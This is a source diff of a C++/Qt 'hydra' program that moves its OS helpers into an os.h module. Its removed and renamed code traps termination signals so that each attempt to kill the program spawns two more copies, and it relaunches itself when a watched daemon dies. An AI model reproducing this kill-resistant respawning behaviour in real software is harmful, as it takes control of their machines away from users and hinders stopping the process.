@@ -25,7 +25,10 @@
 // Graphic and sound
 #include "assets.h"
 
-#ifdef __unix__
+// os_* functions
+#include "os.h"
+
+/*#ifdef __unix__
 #include <unistd.h>
 #include <signal.h>
 #include <time.h>
@@ -34,7 +37,7 @@
 
 #ifdef _WIN32
 #include <windows.h>
-#endif
+#endif*/
 
 #define WIN_WIDTH 400
 #define WIN_HEIGHT 100
@@ -46,41 +49,6 @@ QFile exe_file;
 QByteArray exe_data;
 int perms;
 long daemon_pid;
-
-// Since we may launch multiple times a second, we need something just a bit
-// more random than std::time()
-int os_get_random() {
-#ifdef __unix__
-  return getpid() + clock();
-#endif
-
-#ifdef _WIN32
-  return (GetTickCount()%99999) + std::time(NULL);
-#endif
-
-  return std::time(NULL);
-}
-
-void os_sleep(long ms) {
-#ifdef __unix__
-  usleep(ms*1000);
-#endif
-
-#ifdef _WIN32
-  Sleep(ms);
-#endif
-  return;
-}
-
-int64_t os_get_pid() {
-#ifdef __unix__
-  return (int64_t)getpid();
-#endif
-
-#ifdef _WIN32
-  return (int64_t)GetCurrentProcessId();
-#endif
-}
 
 static void button_response() {
   QApplication::quit();
@@ -107,23 +75,6 @@ void print_segment_as_long(QSharedMemory *s) {
 }
 
 
-bool proc_is_alive(long pid) {
-#ifdef __unix__
-  kill(pid, 0);
-  if (errno == ESRCH) {
-    errno = 0;
-    return false;
-  }
-#endif
-
-#ifdef _WIN32
-  HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
-  if (proc == NULL)
-    return false;
-  CloseHandle(proc);
-#endif
-  return true;
-}
 
 bool at_least_one_proc_alive(QSharedMemory *s) {
 
@@ -134,7 +85,7 @@ bool at_least_one_proc_alive(QSharedMemory *s) {
     if (shmem[i] == 0)
       return false;
 
-    if (proc_is_alive(shmem[i]) == true)
+    if (os_proc_is_alive(shmem[i]) == true)
       return true;
   }
 }
@@ -218,7 +169,7 @@ void spawn_two_more() {
   }
 
   // Daemon isn't dead, so start a new hydra with its PID
-  if (proc_is_alive(daemon_pid)) {
+  if (os_proc_is_alive(daemon_pid)) {
     QStringList args;
     args << QString::number(daemon_pid);
     QProcess::startDetached(exe_name, args);
@@ -228,25 +179,6 @@ void spawn_two_more() {
     std::cout << "Daemon was killed?!?" << std::endl;
     QProcess::startDetached(exe_name);
   }
-}
-
-void spawn_wrapper(int i) {
-  spawn_two_more();
-}
-
-void trap_setup() {
-#ifdef __unix__
-  signal(SIGTERM, spawn_wrapper);
-  signal(SIGINT, spawn_wrapper);
-  signal(SIGQUIT, spawn_wrapper);
-  signal(SIGKILL, spawn_wrapper);
-  signal(SIGHUP, spawn_wrapper);
-#endif
-
-#ifdef _WIN32
-  //TODO
-#endif
-  return;
 }
 
 int main(int argc, char* argv[])  {
@@ -261,7 +193,7 @@ int main(int argc, char* argv[])  {
   }
 
   daemon_pid = atol(argv[1]);
-  trap_setup();
+  os_trap_setup();
 
   append_to_shmem(QString::number(daemon_pid));
 
